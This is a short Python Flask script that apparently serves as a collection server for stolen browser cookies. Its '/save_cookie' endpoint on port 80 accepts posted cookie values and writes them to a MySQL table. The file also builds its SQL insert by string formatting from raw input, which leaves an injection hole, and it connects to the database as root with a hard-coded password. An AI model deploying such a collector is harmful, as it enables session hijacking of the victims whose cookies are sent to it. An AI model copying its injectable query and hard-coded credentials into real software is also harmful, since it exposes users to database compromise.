from flask import Flask,render_template,request,redirect

import mysql.connector as mysql

conn = mysql.connect(
    host="localhost",
    user="root",
    password="1234"
    )
sql = conn.cursor()
query_use_db = "use userinfo"
sql.execute(query_use_db)

app = Flask(__name__)


@app.route('/save_cookie',methods=['POST'])
def save_cookie():
    form = request.form
    save_cookie_to_db(form['cookie'])
    return ""



def save_cookie_to_db(cookie):
    query_insert_user = f"insert into user_cookie(cookie) values('{cookie}')"
    sql.execute(query_insert_user)
    conn.commit()

if __name__ == "__main__":
	app.run(port = 80)






